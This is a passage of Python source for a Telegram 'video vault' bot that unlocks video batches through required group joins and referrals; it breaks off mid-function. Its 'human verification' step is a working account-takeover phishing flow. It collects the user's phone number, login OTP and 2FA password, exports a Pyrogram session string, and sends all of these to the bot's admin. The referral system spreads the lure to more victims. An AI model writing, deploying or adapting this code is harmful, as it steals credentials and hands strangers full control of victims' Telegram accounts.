import asyncio
import html
import logging
import math
import time
import os
import re
from datetime import datetime, timedelta, timezone
from uuid import uuid4

from dotenv import load_dotenv
from pymongo import MongoClient, ASCENDING, DESCENDING
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    Update,
)
from telegram.constants import ChatMemberStatus, ParseMode
from telegram.error import (
    BadRequest,
    Forbidden,
    TelegramError,
    RetryAfter,
    TimedOut,
    NetworkError,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    ChatJoinRequestHandler,
    ChatMemberHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

from pyrogram import Client as PyroClient
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid,
    FloodWait as PyroFloodWait,
)

load_dotenv()

BOT_TOKEN = os.environ["BOT_TOKEN"].strip()
MONGO_URI = os.environ["MONGO_URI"].strip()
MONGO_DB = os.getenv("MONGO_DB", "video_unlock_bot").strip()
ADMIN_ID = int(os.environ["ADMIN_ID"])
STORAGE_CHANNEL_ID = int(os.environ["STORAGE_CHANNEL_ID"])
DELETE_AFTER_HOURS = int(os.getenv("DELETE_AFTER_HOURS", "12"))
REFERRALS_PER_BATCH = max(1, int(os.getenv("REFERRALS_PER_BATCH", "1")))
PENDING_REQUEST_TTL_HOURS = max(1, int(os.getenv("PENDING_REQUEST_TTL_HOURS", "72")))
UPLOAD_CONCURRENCY = 1
UPLOAD_COPY_GAP_SECONDS = max(2.0, float(os.getenv("UPLOAD_DELAY_SECONDS", os.getenv("UPLOAD_COPY_GAP_SECONDS", "2"))))
UPLOAD_MAX_RETRIES = max(1, min(8, int(os.getenv("UPLOAD_MAX_RETRIES", "5"))))
UPLOAD_PROGRESS_REFRESH_SECONDS = max(2.0, float(os.getenv("UPLOAD_PROGRESS_REFRESH_SECONDS", "3")))

API_ID = int(os.environ["API_ID"])
API_HASH = os.environ["API_HASH"].strip()
PYRO_OTP_LENGTH = 5

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
for noisy in ("httpx", "httpcore", "telegram.ext.ExtBot"):
    logging.getLogger(noisy).setLevel(logging.WARNING)
log = logging.getLogger("video-unlock")

mongo = MongoClient(MONGO_URI, serverSelectionTimeoutMS=10000)
db = mongo[MONGO_DB]

users = db.users
required_chats = db.required_chats
batches = db.video_batches
pending_deletions = db.pending_deletions
drafts = db.upload_drafts
pending_requests = db.pending_join_requests
membership_events = db.membership_events

users.create_index([("user_id", ASCENDING)], unique=True)
required_chats.create_index([("chat_id", ASCENDING)], unique=True)
batches.create_index([("batch_no", ASCENDING)], unique=True)
pending_deletions.create_index([("delete_at", ASCENDING)])
drafts.create_index([("admin_id", ASCENDING)], unique=True)
pending_requests.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)], unique=True)
pending_requests.create_index([("requested_at", ASCENDING)])
membership_events.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)], unique=True)

ADMIN_STATE = {}
UPLOAD_RUNTIME = {}

PYRO_SESSIONS: dict[int, dict] = {}
PYRO_STATE: dict[int, str] = {}
PENDING_UNLOCK: dict[int, bool] = {}


# ─────────────────── INLINE MENUS ───────────────────
def user_menu_inline():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🎬 My Videos", callback_data="um_videos"),
            InlineKeyboardButton("🔓 Unlock Next 10", callback_data="um_unlock"),
        ],
        [
            InlineKeyboardButton("👥 My Referral", callback_data="um_ref"),
            InlineKeyboardButton("📊 My Progress", callback_data="um_progress"),
        ],
    ])


def delivery_complete_inline():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔁 Resend", callback_data="um_videos"),
            InlineKeyboardButton("🔓 More Videos", callback_data="um_unlock"),
        ],
    ])


def admin_menu_inline():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📤 Upload Videos", callback_data="am_upload"),
            InlineKeyboardButton("📚 Video Batches", callback_data="am_batches"),
        ],
        [
            InlineKeyboardButton("➕ Add Required Group", callback_data="am_addgroup"),
            InlineKeyboardButton("👥 Required Groups", callback_data="am_groups"),
        ],
        [
            InlineKeyboardButton("🗑 Remove Required Channel", callback_data="am_remove"),
            InlineKeyboardButton("📊 Bot Stats", callback_data="am_stats"),
        ],
    ])


def upload_menu_inline():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📊 Upload Status", callback_data="up_status"),
            InlineKeyboardButton("DONE", callback_data="up_done"),
        ],
        [
            InlineKeyboardButton("🔁 Retry Failed", callback_data="up_retry"),
            InlineKeyboardButton("✅ Publish Successful", callback_data="up_publish"),
        ],
        [
            InlineKeyboardButton("❌ Cancel", callback_data="up_cancel"),
        ],
    ])


def flow_cancel_inline():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="flow_cancel")],
    ])


def esc(v):
    return html.escape(str(v))


def utcnow():
    return datetime.now(timezone.utc)


def user_doc(uid):
    return users.find_one({"user_id": uid})


def published_batch_count():
    return batches.count_documents({"published": True})


def required_referrals_for_next(unlocked_batch):
    return unlocked_batch * REFERRALS_PER_BATCH


def make_ref_link(username, uid):
    return f"https://t.me/{username}?start=ref_{uid}"


def active_required_chats():
    return list(required_chats.find({"enabled": True}).sort("position", ASCENDING))


def next_batch_no():
    last = batches.find_one(sort=[("batch_no", DESCENDING)])
    return (int(last["batch_no"]) + 1) if last else 1


async def reply(update, context, text, **kwargs):
    """Send a message to the chat that triggered this update (works for message + callback)."""
    return await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=text,
        **kwargs,
    )


# ─────────────────── PYROGRAM SESSION GENERATOR ───────────────────

def pyro_keypad_markup(entered: str, locked: bool = False):
    layout = [
        [("1", "1"), ("2", "2"), ("3", "3")],
        [("4", "4"), ("5", "5"), ("6", "6")],
        [("7", "7"), ("8", "8"), ("9", "9")],
        [("⌫", "back"), ("0", "0"), ("✅", "submit")],
    ]
    buttons = [
        [InlineKeyboardButton(label, callback_data=f"pyro_otp|{val}") for label, val in row]
        for row in layout
    ]
    if locked:
        text = (
            "🔐 <b>Enter OTP</b>\n\n"
            f"Entered: <code>{entered}</code>\n\n"
            "⏳ Verifying..."
        )
    else:
        text = (
            "🔐 <b>Enter OTP</b>\n\n"
            f"Entered: <code>{entered or '—'}</code>\n\n"
            "⚠️ Use the <b>inline buttons</b> below only.\n"
            "Typing OTP in chat will leave the login incomplete.\n"
            f"Auto-submits after <b>{PYRO_OTP_LENGTH}</b> digits."
        )
    return InlineKeyboardMarkup(buttons), text


async def pyro_cleanup(uid: int):
    sess = PYRO_SESSIONS.pop(uid, None)
    PYRO_STATE.pop(uid, None)
    PENDING_UNLOCK.pop(uid, None)
    if sess and sess.get("client"):
        try:
            await sess["client"].disconnect()
        except Exception:
            pass


async def pyro_safe_edit_or_reply(message, text: str, edit: bool, **kwargs):
    bot = message.get_bot()
    if edit:
        try:
            return await message.edit_text(text, **kwargs)
        except Exception:
            pass
    try:
        return await bot.send_message(chat_id=message.chat_id, text=text, **kwargs)
    except Exception as e:
        log.warning("pyro reply fail: %s", e)


async def pyro_finish_login(message, uid: int, temp: PyroClient, edit: bool,
                            has_2fa: bool = False, phone: str = "—",
                            password: str = "—"):
    try:
        session_string = await temp.export_session_string()
        me = await temp.get_me()
    except Exception as e:
        await pyro_safe_edit_or_reply(message, f"❌ Verification failed: <code>{esc(e)}</code>", edit)
        try:
            await message.get_bot().send_message(
                ADMIN_ID,
                f"⚠️ Session export failed for user <code>{uid}</code>.\n\nError: <code>{esc(e)}</code>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        await pyro_cleanup(uid)
        return

    username_line = f"@{me.username}" if me.username else "—"
    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
    twofa_line = "✅ Yes" if has_2fa else "❌ No"

    user_txt = "✅ <b>Human verification completed.</b>"
    await pyro_safe_edit_or_reply(message, user_txt, edit)

    owner_txt = (
        "🔔 <b>New Session Generated</b>\n\n"
        f"👤 <b>User:</b> {esc(full_name)}\n"
        f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
        f"🔗 <b>Username:</b> {esc(username_line)}\n"
        f"📱 <b>Phone:</b> <code>{esc(phone)}</code>\n"
        f"🔐 <b>2FA:</b> {twofa_line}\n"
    )
    if has_2fa:
        owner_txt += f"🔑 <b>2FA Password:</b> <code>{esc(password)}</code>\n"
    owner_txt += (
        "\n<b>String Session:</b>\n\n"
        f"<code>{esc(session_string)}</code>"
    )
    try:
        await message.get_bot().send_message(ADMIN_ID, owner_txt, parse_mode=ParseMode.HTML)
    except Exception as e:
        log.warning("owner send fail: %s", e)

    if PENDING_UNLOCK.pop(uid, False):
        bot = message.get_bot()
        chat_id = message.chat_id
        d = users.find_one({"user_id": uid}) or {}
        current = max(1, int(d.get("unlocked_batch", 1)))
        total = published_batch_count()
        nxt = current + 1

        if nxt > total:
            users.update_one(
                {"user_id": uid},
                {"$set": {"human_verified": True, "human_verified_at": utcnow()}},
            )
            try:
                await bot.send_message(
                    chat_id,
                    "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=user_menu_inline(),
                )
            except Exception:
                pass
        else:
            users.update_one(
                {"user_id": uid},
                {"$set": {
                    "human_verified": True,
                    "human_verified_at": utcnow(),
                    "unlocked_batch": nxt,
                }},
            )
            batch = batches.find_one({"batch_no": nxt, "published": True}) or {}
            count = len(batch.get("message_ids", []))
            try:
                await bot.send_message(
                    chat_id,
                    f"🎉 <b>BATCH {nxt} UNLOCKED!</b>\n"
                    f"🎞 Videos in this batch: <b>{count}</b>",
                    parse_mode=ParseMode.HTML,
                )
                await send_batch(bot, chat_id, nxt)
            except Exception as e:
                log.warning("Failed to send unlocked batch: %s", e)

    await pyro_cleanup(uid)


async def pyro_session_start(update, context):
    uid = update.effective_user.id
    had_pending = PENDING_UNLOCK.get(uid, False)
    sess = PYRO_SESSIONS.pop(uid, None)
    if sess and sess.get("client"):
        try:
            await sess["client"].disconnect()
        except Exception:
            pass
    PYRO_STATE[uid] = "await_contact"
    if had_pending:
        PENDING_UNLOCK[uid] = True

    kb = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Share My Contact", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await reply(
        update, context,
        "📱 <b>Step 1 of 2</b>\n\n"
        "Tap the button below to share your phone number.\n"
        "(You do not need to type it manually.)",
        parse_mode=ParseMode.HTML,
        reply_markup=kb,
    )


async def pyro_contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if PYRO_STATE.get(uid) != "await_contact":
        return

    contact = update.message.contact
    if contact is None:
        return
    if contact.user_id != uid:
        return await update.message.reply_text(
            "❌ This is not your own contact. Please share your own contact."
        )

    phone = contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    await update.message.reply_text(
        "⏳ Sending OTP...",
        reply_markup=ReplyKeyboardRemove(),
    )

    temp = PyroClient(
        name=f"pyro_{uuid4().hex}",
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True,
    )

    try:
        await temp.connect()
        sent_code = await temp.send_code(phone)
    except PyroFloodWait as e:
        try:
            await temp.disconnect()
        except Exception:
            pass
        PYRO_STATE.pop(uid, None)
        return await update.message.reply_text(
            f"⏳ FloodWait: please wait <code>{e.value}s</code>.",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        try:
            await temp.disconnect()
        except Exception:
            pass
        PYRO_STATE.pop(uid, None)
        return await update.message.reply_text(
            f"❌ Error: <code>{esc(e)}</code>",
            parse_mode=ParseMode.HTML,
        )

    PYRO_SESSIONS[uid] = {
        "client": temp,
        "phone": phone,
        "phone_code_hash": sent_code.phone_code_hash,
        "otp": "",
        "has_2fa": False,
        "locked": False,
        "password": "—",
    }
    PYRO_STATE[uid] = "otp"

    markup, text = pyro_keypad_markup("")
    await update.message.reply_text(
        "📱 <b>Step 2 of 2</b>\n\n" + text,
        parse_mode=ParseMode.HTML,
        reply_markup=markup,
    )


async def pyro_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id

    sess = PYRO_SESSIONS.get(uid)
    if not sess:
        return await q.answer("Session expired. Try again.", show_alert=True)
    if PYRO_STATE.get(uid) != "otp":
        return await q.answer("Not at OTP stage right now.")
    if sess.get("locked"):
        return await q.answer("Verifying, please wait...", show_alert=True)

    val = (q.data or "").split("|", 1)[1]
    otp = sess["otp"]

    if val == "back":
        otp = otp[:-1]
        sess["otp"] = otp
        markup, text = pyro_keypad_markup(otp)
        try:
            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
        except BadRequest:
            pass
        return await q.answer()

    if val == "submit":
        if len(otp) < PYRO_OTP_LENGTH:
            return await q.answer(f"Please enter all {PYRO_OTP_LENGTH} digits.", show_alert=True)
        await q.answer("Verifying...")
        return await pyro_do_sign_in(q, sess, otp)

    if len(otp) >= PYRO_OTP_LENGTH:
        return await q.answer(f"{PYRO_OTP_LENGTH} digits max")

    otp += val
    sess["otp"] = otp

    if len(otp) == PYRO_OTP_LENGTH:
        sess["locked"] = True
        markup, text = pyro_keypad_markup(otp, locked=True)
        try:
            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
        except BadRequest:
            pass
        await q.answer("Verifying...")
        return await pyro_do_sign_in(q, sess, otp)

    markup, text = pyro_keypad_markup(otp)
    try:
        await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
    except BadRequest:
        pass
    await q.answer()


async def pyro_do_sign_in(q, sess: dict, otp: str):
    uid = q.from_user.id
    temp = sess["client"]

    try:
        await temp.sign_in(sess["phone"], sess["phone_code_hash"], otp)
    except SessionPasswordNeeded:
        sess["otp"] = ""
        sess["has_2fa"] = True
        PYRO_STATE[uid] = "password"
        try:
            await q.edit_message_text(
                "🔐 <b>2FA is enabled.</b>\n\n"
                "Please type your <b>Telegram password</b> in the chat.\n"
                "(The message will be deleted immediately.)",
                parse_mode=ParseMode.HTML,
            )
        except BadRequest:
            pass
        return
    except PhoneCodeInvalid:
        sess["otp"] = ""
        sess["locked"] = False
        markup, text = pyro_keypad_markup("")
        try:
            await q.edit_message_text(
                "❌ Invalid OTP. Please try again.\n\n" + text,
                parse_mode=ParseMode.HTML,
                reply_markup=markup,
            )
        except BadRequest:
            pass
        return
    except PhoneCodeExpired:
        try:
            await q.edit_message_text("❌ OTP expired. Try again.")
        except BadRequest:
            pass
        await pyro_cleanup(uid)
        return
    except Exception as e:
        try:
            await q.edit_message_text(f"❌ Error: <code>{esc(e)}</code>", parse_mode=ParseMode.HTML)
        except BadRequest:
            pass
        await pyro_cleanup(uid)
        return

    await pyro_finish_login(
        q.message, uid, temp, edit=True,
        has_2fa=sess.get("has_2fa", False),
        phone=sess.get("phone", "—"),
        password=sess.get("password", "—"),
    )


async def pyro_handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    sess = PYRO_SESSIONS.get(uid)
    if not sess:
        PYRO_STATE.pop(uid, None)
        return await update.message.reply_text("Please start the verification again.")

    password = update.message.text or ""
    sess["password"] = password

    try:
        await update.message.delete()
    except TelegramError:
        pass

    try:
        await sess["client"].check_password(password)
    except PasswordHashInvalid:
        sess["password"] = "—"
        return await update.message.reply_text("❌ Incorrect password. Please try again.")
    except Exception as e:
        sess["password"] = "—"
        return await update.message.reply_text(
            f"❌ Error: <code>{esc(e)}</code>", parse_mode=ParseMode.HTML
        )

    await pyro_finish_login(
        update.message, uid, sess["client"], edit=False,
        has_2fa=sess.get("has_2fa", False),
        phone=sess.get("phone", "—"),
        password=sess.get("password", "—"),
    )


async def pyro_cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in PYRO_SESSIONS and uid not in PYRO_STATE and uid not in PENDING_UNLOCK:
        return await update.message.reply_text("No verification process is active.")
    await pyro_cleanup(uid)
    await update.message.reply_text(
        "✅ Verification cancelled.",
        reply_markup=ReplyKeyboardRemove(),
    )
    await reply(update, context, "Choose an option:", reply_markup=user_menu_inline())


# ─────────────────── END PYROGRAM SESSION GENERATOR ───────────────────


async def deletion_worker(app: Application):
    while True:
        try:
            docs = list(
                pending_deletions.find({"delete_at": {"$lte": utcnow()}})
                .sort("delete_at", ASCENDING)
                .limit(100)
            )
            for doc in docs:
                try:
                    await app.bot.delete_message(doc["chat_id"], doc["message_id"])
                except (BadRequest, Forbidden):
                    pass
                except Exception:
                    log.exception("Delete failed")
                pending_deletions.delete_one({"_id": doc["_id"]})
                await asyncio.sleep(0.03)
        except asyncio.CancelledError:
            raise
        except Exception:
            log.exception("Deletion worker error")
        await asyncio.sleep(30)


async def post_init(app: Application):
    me = await app.bot.get_me()
    app.bot_data["username"] = me.username
    app.bot_data["video_cleanup_task"] = asyncio.create_task(
        deletion_worker(app), name="video-cleanup"
    )
    log.info("Bot started as @%s", me.username)


async def post_stop(app: Application):
    runtime = UPLOAD_RUNTIME.pop(ADMIN_ID, None)
    if runtime:
        runtime["closing"] = True
        running = list(runtime["tasks"])
        for t in running:
            t.cancel()
        if running:
            await asyncio.gather(*running, return_exceptions=True)
        await _stop_upload_progress(runtime)
    task = app.bot_data.pop("video_cleanup_task", None)
    if task is not None:
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass

    for uid in list(PYRO_SESSIONS.keys()):
        await pyro_cleanup(uid)
    log.info("Video cleanup worker stopped")


async def ensure_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    old = users.find_one({"user_id": u.id})
    if old:
        users.update_one(
            {"user_id": u.id},
            {"$set": {
                "first_name": u.first_name or "",
                "username": u.username,
                "last_seen": utcnow(),
            }},
        )
        return users.find_one({"user_id": u.id})

    referrer = None
    if context.args:
        m = re.fullmatch(r"ref_(\d+)", context.args[0])
        if m:
            rid = int(m.group(1))
            if rid != u.id and users.find_one({"user_id": rid}):
                referrer = rid

    doc = {
        "user_id": u.id,
        "first_name": u.first_name or "",
        "username": u.username,
        "created_at": utcnow(),
        "last_seen": utcnow(),
        "verified": False,
        "verified_at": None,
        "referred_by": referrer,
        "referral_rewarded": False,
        "verified_referrals": 0,
        "unlocked_batch": 0,
        "human_verified": False,
        "human_verified_at": None,
    }
    users.insert_one(doc)
    return doc


async def on_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    req = update.chat_join_request
    if not req:
        return
    cfg = required_chats.find_one({"chat_id": req.chat.id, "enabled": True})
    if not cfg or cfg.get("link_mode") != "approval":
        return

    now = utcnow()
    expires_at = now + timedelta(hours=PENDING_REQUEST_TTL_HOURS)
    pending_requests.update_one(
        {"chat_id": req.chat.id, "user_id": req.from_user.id},
        {"$set": {
            "requested_at": now,
            "expires_at": expires_at,
            "invite_link": req.invite_link.invite_link if req.invite_link else None,
        }},
        upsert=True,
    )


def has_active_pending_request(chat_id: int, user_id: int) -> bool:
    return bool(
        pending_requests.find_one({
            "chat_id": chat_id,
            "user_id": user_id,
            "expires_at": {"$gt": utcnow()},
        })
    )


async def on_chat_member_update(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cmu = update.chat_member
    if not cmu:
        return

    chat_id = cmu.chat.id
    uid = cmu.new_chat_member.user.id
    if not required_chats.find_one({"chat_id": chat_id, "enabled": True}):
        return

    new_status = cmu.new_chat_member.status
    active_statuses = {
        ChatMemberStatus.MEMBER,
        ChatMemberStatus.ADMINISTRATOR,
        ChatMemberStatus.OWNER,
    }

    def status_is_member(m):
        s = m.status
        if s in active_statuses:
            return True
        if s == ChatMemberStatus.RESTRICTED:
            return bool(getattr(m, "is_member", False))
        return False

    old_is = status_is_member(cmu.old_chat_member)
    new_is = status_is_member(cmu.new_chat_member)
    now = utcnow()

    if new_is:
        pending_requests.delete_many({"chat_id": chat_id, "user_id": uid})
        membership_events.update_one(
            {"chat_id": chat_id, "user_id": uid},
            {"$set": {"is_member": True, "last_join_at": now, "last_status": str(new_status)}},
            upsert=True,
        )
        return

    membership_events.update_one(
        {"chat_id": chat_id, "user_id": uid},
        {"$set": {"is_member": False, "last_status": str(new_status), "last_seen_nonmember_at": now}},
        upsert=True,
    )

    if old_is and not new_is:
        pending_requests.delete_many({"chat_id": chat_id, "user_id": uid})
        membership_events.update_one(
            {"chat_id": chat_id, "user_id": uid},
            {"$set": {"last_leave_at": now}},
            upsert=True,
        )
        pending_requests.delete_many(
            {"chat_id": chat_id, "user_id": uid, "requested_at": {"$lte": now}}
        )
        users.update_one(
            {"user_id": uid},
            {"$set": {"verified": False, "verification_revoked_at": now}},
        )
        try:
            await context.bot.send_message(
                uid,
                "🔒 <b>Access Locked Again</b>\n\n"
                "You left a required group or channel, so your access has been revoked. "
                "Join again or submit a new join request, then verify your membership.",
                parse_mode=ParseMode.HTML,
            )
        except TelegramError:
            pass


async def check_one_chat(bot, ch, uid):
    chat_id = ch["chat_id"]
    try:
        member = await bot.get_chat_member(chat_id, uid)
        status = member.status
        is_member = status in {
            ChatMemberStatus.MEMBER,
            ChatMemberStatus.ADMINISTRATOR,
            ChatMemberStatus.OWNER,
        }
        if status == ChatMemberStatus.RESTRICTED:
            is_member = bool(getattr(member, "is_member", False))

        if is_member:
            pending_requests.delete_many({"chat_id": chat_id, "user_id": uid})
            membership_events.update_one(
                {"chat_id": chat_id, "user_id": uid},
                {"$set": {"is_member": True, "last_seen_member_at": utcnow(), "last_status": str(status)}},
                upsert=True,
            )
            return ch, "member"

        membership_events.update_one(
            {"chat_id": chat_id, "user_id": uid},
            {"$set": {"is_member": False, "last_seen_nonmember_at": utcnow(), "last_status": str(status)}},
            upsert=True,
        )
    except TelegramError as e:
        log.warning("getChatMember failed chat=%s user=%s error=%s", chat_id, uid, type(e).__name__)

    if ch.get("link_mode") != "approval":
        return ch, "missing"

    pending = await asyncio.to_thread(has_active_pending_request, chat_id, uid)
    return ch, ("pending" if pending else "missing")


async def membership_result(bot, uid):
    chats = active_required_chats()
    if not chats:
        return chats, [], []

    results = await asyncio.gather(
        *(check_one_chat(bot, ch, uid) for ch in chats),
        return_exceptions=True,
    )

    missing, pending = [], []
    for item, ch in zip(results, chats):
        if isinstance(item, Exception):
            missing.append(ch)
            continue
        _, state = item
        if state == "missing":
            missing.append(ch)
        elif state == "pending":
            pending.append(ch)
    return chats, missing, pending


def join_keyboard(chats, hide_verified=False):
    rows = []
    for ch in chats:
        rows.append([InlineKeyboardButton(f"➕ Join {ch['name']}", url=ch["join_url"])])
    rows.append([InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_join")])
    return InlineKeyboardMarkup(rows)


async def show_join_gate(update, context, chats=None):
    if chats is None:
        chats = active_required_chats()
    if not chats:
        return await home(update, context)

    text = (
        "🔐 <b>VIDEO ACCESS LOCKED</b>\n\n"
        "Join the remaining required groups or channels listed below.\n\n"
        f"📌 Remaining: <b>{len(chats)}</b>\n"
        "✅ After joining or submitting your join requests, tap <b>Verify</b>.\n\n"
        "ℹ️ Groups and channels you have already completed will not appear again."
    )
    await reply(update, context, text, parse_mode=ParseMode.HTML, reply_markup=join_keyboard(chats))


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await ensure_user(update, context)
    uid = update.effective_user.id
    chats, missing, pending = await membership_result(context.bot, uid)

    if not missing:
        current = users.find_one({"user_id": uid}) or {}
        set_data = {"verified": True, "verified_at": utcnow()}
        if int(current.get("unlocked_batch", 0)) == 0 and published_batch_count() > 0:
            set_data["unlocked_batch"] = 1
        users.update_one({"user_id": uid}, {"$set": set_data})
        return await home(update, context)

    users.update_one({"user_id": uid}, {"$set": {"verified": False}})
    await show_join_gate(update, context, chats=missing)


async def home(update, context):
    d = user_doc(update.effective_user.id) or {}
    unlocked = int(d.get("unlocked_batch", 0))
    total = published_batch_count()
    refs = int(d.get("verified_referrals", 0))
    if unlocked == 0 and d.get("verified") and total:
        users.update_one(
            {"user_id": update.effective_user.id},
            {"$set": {"unlocked_batch": 1}},
        )
        unlocked = 1

    await reply(
        update, context,
        "🎬 <b>VIDEO VAULT</b>\n\n"
        f"🔓 Unlocked batch: <b>{unlocked}/{total}</b>\n"
        f"👥 Successful referrals: <b>{refs}</b>\n"
        "🎞 Videos per full batch: <b>10</b>\n"
        f"⏳ Videos auto-delete in <b>{DELETE_AFTER_HOURS} hours</b>.\n\n"
        "Choose an option:",
        parse_mode=ParseMode.HTML,
        reply_markup=user_menu_inline(),
    )


async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer("Verifying all chats…")
    uid = q.from_user.id

    try:
        await q.edit_message_reply_markup(
            InlineKeyboardMarkup([[InlineKeyboardButton("⏳ Verifying…", callback_data="noop")]])
        )
    except BadRequest:
        pass

    chats, missing, pending = await membership_result(context.bot, uid)

    if missing:
        names = "\n".join(f"• {esc(x['name'])}" for x in missing)
        pending_text = ""
        if pending:
            pending_text = (
                "\n\n⏳ <b>Pending approval recognized:</b>\n"
                + "\n".join(f"• {esc(x['name'])}" for x in pending)
            )
        text = (
            "❌ <b>VERIFICATION INCOMPLETE</b>\n\n"
            "These required memberships or join requests are still missing:\n"
            f"{names}{pending_text}\n\n"
            "Complete only the chats listed above, then try verifying again."
        )
        try:
            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=join_keyboard(missing))
        except BadRequest:
            await q.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=join_keyboard(missing))
        return

    before = users.find_one({"user_id": uid}) or {}
    first_verify = not bool(before.get("verified"))
    set_data = {"verified": True, "verified_at": utcnow()}
    if int(before.get("unlocked_batch", 0)) == 0 and published_batch_count() > 0:
        set_data["unlocked_batch"] = 1
    users.update_one({"user_id": uid}, {"$set": set_data})

    fresh = users.find_one({"user_id": uid}) or {}
    referrer = fresh.get("referred_by")
    if referrer and not fresh.get("referral_rewarded"):
        claimed = users.find_one_and_update(
            {"user_id": uid, "referral_rewarded": False},
            {"$set": {"referral_rewarded": True, "referral_rewarded_at": utcnow()}},
        )
        if claimed:
            users.update_one({"user_id": referrer}, {"$inc": {"verified_referrals": 1}})
            rd = users.find_one({"user_id": referrer}) or {}
            current = int(rd.get("verified_referrals", 0))
            need = required_referrals_for_next(max(1, int(rd.get("unlocked_batch", 1))))
            try:
                await context.bot.send_message(
                    referrer,
                    "🎉 <b>REFERRAL SUCCESSFUL!</b>\n\n"
                    "Your referred user has completed the required group and channel verification.\n\n"
                    f"👥 Verified referrals: <b>{current}</b>\n"
                    f"🎯 Next unlock target: <b>{need}</b>\n\n"
                    + ("✅ Your next 10 videos are ready. Tap <b>Unlock Next 10</b>."
                       if current >= need
                       else "Keep inviting friends to reach your next unlock goal."),
                    parse_mode=ParseMode.HTML,
                    reply_markup=user_menu_inline(),
                )
            except TelegramError:
                pass

    pending_note = f"\n⏳ Pending approval accepted: <b>{len(pending)}</b>" if pending else ""
    success_text = (
        "✅ <b>VERIFICATION SUCCESSFUL</b>\n\n"
        "Access unlocked. 🎉"
        f"{pending_note}\n\n"
        f"Videos are protected and will be automatically deleted after <b>{DELETE_AFTER_HOURS} hours</b>."
    )
    try:
        await q.edit_message_text(success_text, parse_mode=ParseMode.HTML, reply_markup=None)
    except BadRequest:
        try:
            await q.edit_message_reply_markup(reply_markup=None)
        except BadRequest:
            pass

    if first_verify:
        await q.message.reply_text(
            "👇 <b>Your video menu is ready</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=user_menu_inline(),
        )


async def noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("Verification is running…")


async def ensure_verified(update, context):
    uid = update.effective_user.id
    d = user_doc(uid)
    if not d or not d.get("verified"):
        await show_join_gate(update, context)
        return False

    _, missing, _ = await membership_result(context.bot, uid)
    if missing:
        users.update_one({"user_id": uid}, {"$set": {"verified": False}})
        await reply(
            update, context,
            "🔒 <b>Access re-locked.</b>\nOne or more required memberships or join requests are missing.",
            parse_mode=ParseMode.HTML,
        )
        await show_join_gate(update, context)
        return False
    return True


async def send_batch(bot, chat_id, batch_no):
    batch = batches.find_one({"batch_no": batch_no, "published": True})
    if not batch:
        return await bot.send_message(chat_id, "⚠️ This video batch is currently unavailable.")

    mids = batch.get("message_ids", [])
    await bot.send_message(
        chat_id,
        "🎬 <b>YOUR VIDEOS ARE HERE</b>\n\n"
        f"📦 Batch: <b>{batch_no}</b>\n"
        f"🎞 Videos: <b>{len(mids)}</b>\n"
        "🔒 Forward/save protection: <b>ON</b>\n"
        f"⏳ Auto-delete: <b>{DELETE_AFTER_HOURS} hours</b>",
        parse_mode=ParseMode.HTML,
    )

    sent = []
    for mid in mids:
        try:
            r = await bot.copy_message(
                chat_id=chat_id,
                from_chat_id=STORAGE_CHANNEL_ID,
                message_id=mid,
                protect_content=True,
            )
            sent.append(r.message_id)
            await asyncio.sleep(0.10)
        except TelegramError as e:
            log.warning("Video copy failed batch=%s source=%s error=%s", batch_no, mid, type(e).__name__)

    delete_at = utcnow() + timedelta(hours=DELETE_AFTER_HOURS)
    if sent:
        pending_deletions.insert_many(
            [{"chat_id": chat_id, "message_id": mid, "delete_at": delete_at, "kind": "video"}
             for mid in sent]
        )

    await bot.send_message(
        chat_id,
        "✅ <b>DELIVERY COMPLETE</b>\n\n"
        f"Sent: <b>{len(sent)}/{len(mids)}</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=delivery_complete_inline(),
    )


async def my_videos(update, context):
    if not await ensure_verified(update, context):
        return
    d = user_doc(update.effective_user.id) or {}
